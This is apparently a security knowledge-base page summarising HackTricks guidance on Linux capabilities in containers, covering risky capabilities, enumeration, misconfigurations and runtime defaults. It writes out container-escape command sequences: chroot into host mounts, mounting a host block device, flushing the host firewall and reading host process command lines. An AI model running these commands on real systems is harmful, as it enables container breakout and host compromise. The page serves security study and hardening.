---
title: "HackTricks — Linux Capabilities in Containers"
tags: [container-security, linux-capabilities, privilege-escalation, hacktricks]
sources: [hacktricks-container-capabilities.md]
updated: 2026-05-01
---

# HackTricks — Linux Capabilities in Containers

Source: [HackTricks](../entities/hacktricks.md)

## Key Takeaways

Capabilities define what "root" actually means inside a container. A shell showing `uid=0(root)` does not mean host root or broad kernel privilege — the capability sets decide how much that identity is worth. Capability analysis must be read **together** with namespaces, seccomp, and MAC policy: a capability that is merely risky in an isolated namespace becomes a direct escape primitive when combined with host PID, host network, or host mounts.

For full Linux capability reference, see: [Linux Capabilities](../concepts/linux-capabilities.md)

## High-Risk Capabilities

| Capability       | Container escape relevance                                                                                   |
| ---------------- | ------------------------------------------------------------------------------------------------------------ |
| `CAP_SYS_ADMIN`  | "The new root" — unlocks mount ops, namespace-sensitive behavior, huge kernel surface; most breakout enabler |
| `CAP_SYS_MODULE` | Load kernel modules → effectively host-kernel control; almost never needed in app containers                 |
| `CAP_SYS_PTRACE` | Process memory inspection/tampering; dangerous when combined with `hostPID: true`                            |
| `CAP_NET_ADMIN`  | Reconfigure network stack; catastrophic with `--network=host`                                                |
| `CAP_NET_RAW`    | Raw socket access; enables sniffing, spoofing on host network                                                |

## Enumeration

```bash
capsh --print                    # Human-readable capability sets + securebits
grep '^Cap' /proc/self/status    # Raw bitmasks (CapEff = what's effective now)
```

## Combination Attack Examples

### CAP_SYS_ADMIN + host bind mount → host escape

```bash
capsh --print | grep cap_sys_admin
mount | grep ' /host '
chroot /host /bin/bash
# or: /host/bin/bash -p
```

### CAP_SYS_ADMIN + exposed block device

```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null
chroot /mnt/hostdisk /bin/bash
```

### CAP_NET_ADMIN + host networking

```bash
capsh --print | grep cap_net_admin
ip addr && ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
iptables -F 2>/dev/null   # flush host firewall
```

### CAP_SYS_PTRACE + PID namespace shared

```bash
capsh --print | grep cap_sys_ptrace
ps -ef | head
for p in 1 $(pgrep -n sshd 2>/dev/null); do cat /proc/$p/cmdline 2>/dev/null; echo; done
```

### Mount capability test (blocked by AppArmor?)

```bash
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```

If `CAP_SYS_ADMIN` is present but mount fails, AppArmor is likely the blocking layer.

## Misconfigurations

- `--cap-add=ALL` (obvious)
- Adding `CAP_SYS_ADMIN` to "make the app work" without understanding namespace/mount implications
- Combining extra caps with `--pid=host`, `--network=host`, `--userns=host`
- Assuming "not `--privileged`" = meaningfully constrained (sometimes not operationally true)

## Docker Default Capability Set

Docker keeps a reduced default allowlist and drops the rest. Podman uses a similar reduced model by default. In Kubernetes, if no `securityContext.capabilities` are specified, the container inherits the runtime default for that node.

## Runtime Defaults Table

| Runtime          | Default state                           | Common weakening                                                           |
| ---------------- | --------------------------------------- | -------------------------------------------------------------------------- |
| Docker Engine    | Reduced set by default                  | `--cap-add=<cap>`, `--cap-add=ALL`, `--privileged`                         |
| Podman           | Reduced set, rootless by default        | `--cap-add=<cap>`, `--privileged`                                          |
| Kubernetes       | Inherits runtime default unless changed | `securityContext.capabilities.add`, no `drop: ["ALL"]`, `privileged: true` |
| containerd/CRI-O | Usually runtime default                 | Direct OCI/CRI config can add caps explicitly                              |

## Related Pages

- [Linux Capabilities](../concepts/linux-capabilities.md)
- [Container Security](../concepts/container-security.md)
- [HackTricks — Privileged Containers](hacktricks-privileged-containers.md)
- [HackTricks — Container AppArmor](hacktricks-container-apparmor.md)
- [HackTricks](../entities/hacktricks.md)
